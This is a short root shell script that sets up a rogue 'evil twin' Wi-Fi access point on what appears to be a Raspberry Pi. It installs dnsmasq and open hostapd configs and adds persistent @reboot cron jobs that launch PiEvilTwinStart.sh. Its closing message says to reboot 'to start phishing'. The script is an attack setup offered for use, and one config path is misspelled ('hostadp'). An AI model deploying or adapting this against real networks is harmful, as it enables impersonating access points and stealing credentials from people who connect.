#!/bin/sh -e
if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root." 1>&2
   exit 1
fi
cp -f ./config/dnsmasq.conf /etc/dnsmasq.conf
cp -f ./config/hostapd-OPN.conf /etc/hostadp/hostapd.conf

crontab -l | { cat; echo "@reboot     sudo sleep 10 && sudo sh /root/PiEvilTwinStart.sh && sudo service dnsmasq restart &"; } | crontab -
crontab -l | { cat; echo "@reboot     sudo sleep 10 && sudo service dnsmasq restart &"; } | crontab -

echo "Reboot and wait 30 seconds to start phishing."
exit 0
